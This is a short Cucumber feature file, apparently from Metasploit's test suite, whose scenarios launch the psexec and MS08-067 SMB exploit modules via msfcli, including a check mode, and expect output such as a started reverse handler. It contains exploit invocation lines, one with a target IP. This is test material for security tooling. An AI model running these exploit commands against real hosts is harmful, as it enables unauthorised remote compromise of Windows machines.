#This feature contains scenarios that test running exploits related to microsft windows platforms

@announce-stdout

Feature: I want to launch Windows based exploits
	So that I can hack Windows targets
	So that I can prove how totally unsecured Windows can be

Scenario: Launch Psexec against a Windows Host
	When I run the "./msfcli windows/smb/psexec" exploit with standard target options
	Then the output should contain "445|WORKGROUP as user"
	Then the output should contain "module tree"

Scenario: Launch PSexec in Internal Check Mode
	When I run the "./msfcli windows/smb/psexec" exploit with standard target options in check mode
        Then the output should contain "module tree"
	Then the output should contain "This exploit does not support check."

Scenario: Launch ms08-067 in Internal Check Mode
	When I run the "./msfcli windows/smb/ms08_067_netapi" exploit with standard target options in check mode
	#When I run `./msfcli windows/smb/ms08_067_netapi RHOST=10.6.0.194 C` interactively
	Then the output should contain "module tree"
	Then the output should not contain "Check failed:"

Scenario: Launch ms08-067 against a windows remote host
	When I run the "./msfcli windows/smb/ms08_067_netapi" exploit with standard target options
	Then the output should contain "module tree"
	Then the output should contain "Started reverse handler"



